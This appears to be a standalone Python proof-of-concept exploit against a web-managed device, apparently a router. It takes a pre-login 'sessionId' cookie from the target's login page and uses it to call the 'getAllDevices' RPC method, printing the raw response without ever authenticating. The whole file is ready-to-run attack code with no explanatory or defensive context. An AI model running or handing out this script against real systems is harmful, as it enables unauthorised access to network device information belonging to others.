import requests
import urllib3
import sys

urllib3.disable_warnings()

if len(sys.argv) != 2:
    print(f"Usage: python {sys.argv[0]} <target>")
    sys.exit(1)

target = sys.argv[1]

base = f"http://{target}"

headers = {
    "User-Agent": "Mozilla/5.0",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "*/*"
}

session = requests.Session()

# STEP 1 get sessionId

print("[*] Requesting login page...")

r = session.get(
    f"{base}",
    headers=headers,
    verify=False,
    timeout=10,
    allow_redirects=True
)

session_id = session.cookies.get("sessionId")

if not session_id:
    print("[-] sessionId not found")
    print("[*] Cookies:", session.cookies.get_dict())
    sys.exit(1)

print(f"[+] sessionId: {session_id}")

# STEP 2 call RPC

method = "getAllDevices"

url = f"{base}/html/json.html?method:{method}"

print(f"[*] Calling RPC method: {method}")

try:
    r2 = session.get(
        url,
        headers=headers,
        verify=False,
        timeout=10,
        stream=True
    )

    raw = r2.raw.read(decode_content=False)

    print("\n====== RESPONSE ======\n")
    print(raw.decode(errors="ignore"))

except Exception as e:
    print("[-] Error:", e)